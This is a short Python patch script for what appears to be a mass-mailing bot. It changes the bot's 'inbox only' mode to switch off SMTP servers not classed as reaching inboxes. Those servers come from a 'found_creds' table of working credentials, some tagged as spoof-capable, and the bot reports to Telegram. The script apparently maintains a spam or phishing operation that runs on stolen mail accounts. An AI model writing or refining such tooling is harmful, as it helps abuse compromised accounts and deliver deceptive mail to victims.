#!/usr/bin/env python3
"""Fix INBOX ONLY mode: deactivate non-inbox SMTPs in campaign_smtp table."""

TARGET = "/opt/darkvasend/auditguard/sender_bot.py"

with open(TARGET, "r") as f:
    content = f.read()

OLD = '''    if mode == "inbox":
        # Only use INBOX-classified SMTPs (SPOOF_INBOX + BASIQUE_INBOX)
        import sqlite3 as _sql
        _db = _sql.connect(db_path, timeout=10)
        _db.row_factory = _sql.Row
        _inbox_ids = set()
        for row in _db.execute("SELECT id, context FROM found_creds WHERE auth_ok=1").fetchall():
            ctx = row["context"] or ""
            if "INBOX_" in ctx:
                _inbox_ids.add(row["id"])
        _db.close()
        smtp_list = [s for s in smtp_list if s["cred_id"] in _inbox_ids]
        if not smtp_list:
            send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP INBOX disponible", chat_id)
            mgr.close()
            return'''

NEW = '''    if mode == "inbox":
        # Only use INBOX-classified SMTPs (SPOOF_INBOX + BASIQUE_INBOX)
        # IMPORTANT: deactivate non-inbox SMTPs in campaign_smtp table
        # so the sending loop (which re-fetches from DB) respects the filter
        import sqlite3 as _sql
        _db = _sql.connect(db_path, timeout=10)
        _db.row_factory = _sql.Row
        _inbox_ids = set()
        for row in _db.execute("SELECT id, context FROM found_creds WHERE auth_ok=1").fetchall():
            ctx = row["context"] or ""
            if "INBOX_" in ctx:
                _inbox_ids.add(row["id"])
        _db.close()
        # Deactivate non-inbox SMTPs in the campaign so the loop won't use them
        non_inbox = [s for s in smtp_list if s["cred_id"] not in _inbox_ids]
        for s in non_inbox:
            mgr.deactivate_smtp(s["id"], "not_inbox_classified")
        smtp_list = [s for s in smtp_list if s["cred_id"] in _inbox_ids]
        if not smtp_list:
            send_telegram("CAMP #" + str(campaign_id) + ": aucun SMTP INBOX disponible", chat_id)
            mgr.close()
            return
        inbox_names = ", ".join(s["host"] for s in smtp_list)
        send_telegram("INBOX ONLY: " + str(len(smtp_list)) + " SMTP (" + inbox_names + ")", chat_id)'''

content = content.replace(OLD, NEW)

with open(TARGET, "w") as f:
    f.write(content)

import ast
ast.parse(open(TARGET).read())
print("FIX APPLIED + SYNTAX OK")
